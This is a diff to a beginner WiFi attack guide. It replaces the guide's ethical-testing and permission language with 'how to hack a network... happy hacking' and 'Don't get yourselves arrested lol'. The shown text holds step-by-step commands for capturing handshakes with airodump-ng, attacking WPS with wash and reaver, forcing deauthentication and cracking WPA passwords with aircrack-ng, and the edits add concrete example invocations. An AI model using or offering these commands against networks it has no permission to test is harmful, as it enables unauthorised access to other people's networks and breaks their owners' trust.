@@ -18,7 +18,7 @@
 
 ## Introduction
 
-Welcome to the WiFi Penetration Testing Guide! This guide is designed with beginners in mind and walks you through the basics of wireless network analysis and penetration testing using common tools. Always remember: ethical testing only!
+Greeting this is how to hack a network maybe one of the easiest way if not the easiest, happy hacking :3
 
 ---
 
@@ -27,7 +27,7 @@ Welcome to the WiFi Penetration Testing Guide! This guide is designed with begin
 Before you begin, ensure you have:
 - **Operating System:** A Linux distribution (Kali Linux is highly recommended for beginners).
 - **Wireless Adapter:** An adapter that supports monitor mode and packet injection.
-- **Required Tools:** Tools such as `aircrack-ng suite`, `wash`, `reaver`, and `crunch` should be installed.
+- **Required Tools:** Tools such as `aircrack-ng suite`, `wash`, `reaver`, and `crunch` should be installed (preinstalled on kali).
 - **Basic Command Line Skills:** Familiarity with using the Linux terminal will help you follow along.
 
 ---
@@ -92,8 +92,13 @@ airodump-ng --band abg wlan1
 ### Capture Scan Data
 Replace `<target_mac>` with the network's MAC address and `<channel>` with its channel.
 ```bash
-airodump-ng --bssid <target_mac> --channel <channel> --write capture_file wlan1
+airodump-ng --bssid <target_mac> --channel <channel> --write <file name> wlan1
 ```
+example:
+```bash
+airodump-ng --bssid 00:11:22:33:44:55 --channel 2 --write test.txt wlan1
+```
+
 This command saves the scan results to a file for further analysis.
 
 ---
@@ -102,7 +107,7 @@ This command saves the scan results to a file for further analysis.
 
 WPS attacks target routers with Wi-Fi Protected Setup enabled. This section explains the process step-by-step.
 
-### 1. Identify Networks with WPS Enabled
+### 1. Identify Networks with WPS Enabled (WAY EASIER THAN WPA/2)
 ```bash
 wash --interface wlan1
 ```
@@ -118,6 +123,8 @@ reaver --bssid <target_mac> --channel <channel> --interface wlan1 -vvv --no-asso
 
 ---
 
+if all goes to plan it should show you the password if not carry on with the WPA/2
+
 ## Capturing WPA/WPA2 Handshakes
 
 Capturing the handshake between a router and a connected client is key to testing WPA/WPA2 security.
@@ -125,9 +132,14 @@ Capturing the handshake between a router and a connected client is key to testin
 ### 1. Start Handshake Capture
 Replace `<target_mac>` and `<channel>` with your target’s details.
 ```bash
-airodump-ng --bssid <target_mac> --channel <channel> --write wpa_handshake wlan1
+airodump-ng --bssid <target_mac> --channel <channel> --write <file name> wlan1
+
 ```
 Let this command run until a handshake is captured.
+example: 
+```bash
+airodump-ng --bssid 00:11:22:33:44:55 --channel 2 --write wpa_handshake wlan1
+```
 
 ### 2. Accelerate Handshake Capture with Deauthentication
 Force a connected client to reconnect by deauthenticating them:
@@ -160,8 +172,8 @@ aircrack-ng wpa_handshake-01.cap -w wordlist.txt
 - **`wpa_handshake-01.cap`:** The file containing the captured handshake.
 - **`wordlist.txt`:** Your generated wordlist.
 
-Aircrack-ng will try each password from the wordlist against the handshake until a match is found.
+Aircrack-ng will try each password from the wordlist against the handshake until a match is found (will take some time).
 
 ---
 
-Remember, this guide is designed to help you learn and practice ethical WiFi testing. **Don't get yourselves arrested, folks—always test only on networks you have permission to access!**
+**Don't get yourselves arrested lol**
